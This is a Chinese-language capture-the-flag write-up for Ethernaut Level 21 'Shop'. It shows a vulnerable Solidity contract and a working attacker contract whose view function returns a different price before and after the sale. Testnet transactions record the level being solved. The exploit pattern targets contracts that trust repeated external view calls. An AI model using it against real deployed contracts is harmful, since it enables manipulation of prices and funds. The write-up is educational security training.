# Level 21: Shop

## 1. 问题
修改 `Shop` 合约的 `price`, 将其价格降低

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IBuyer {
  function price() external view returns (uint256);
}

contract Shop {
  uint256 public price = 100;
  bool public isSold;

  function buy() public {
    IBuyer _buyer = IBuyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}
```

## 2. 解法

我们只能通过 `buy()` 修改1次 `price`, 并且设置成 `_buyer.price()`。 我们希望做到第一次调用 `_buyer.price()` 时他比默认值 `100`，后面更新 `price` 时 `_buyer.price()` 又会变成一个小值

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ShopI {
    function price() external view returns (uint256);
    function isSold() external view returns (bool);
    function buy() external;
}

contract BuyerHack {
    ShopI public shop;

    constructor(address _shop) {
        shop = ShopI(_shop);
    }

    function xcall() public {
        shop.buy();
    }

    function price() public view returns (uint256) {
        return shop.isSold() ? shop.price() - 20 : shop.price();
    }
}
```

> [!NOTE]
> solidity `view` 关键字，只限制了函数不能修改任何合约的storage，并没有限制说函数不能读取其他合约的状态并返回不同的值

1. [部署 `BuyerHack` 合约](https://sepolia.etherscan.io/tx/0xe7c35a98bed7835d6961979479b38890242a1fbd39f6f5138dc4f7260da5bf6e)
2. [从 `BuyerHack` 合约嵌套调用 `Shop.buy()` 触发 `price` 更新](https://sepolia.etherscan.io/tx/0xb4ac1e6df1c49937ac705f2c65525c388ef1a6d1357fa27743bea9ee6c0196bc)
3. [Submit instance](https://sepolia.etherscan.io/tx/0xfb7a5d51b8c643198c8d3a2bb1b8acf978f5d052ebf9d9913f38dbc0bd9672e1), 通过！

<br/>
<br/>

| [⬅️ level20 Denial](../level20_denial/README.md) | [level22 Dex ➡️](../level22_dex/README.md) |
| :----------------------------------------------- | ------------------------------------------: |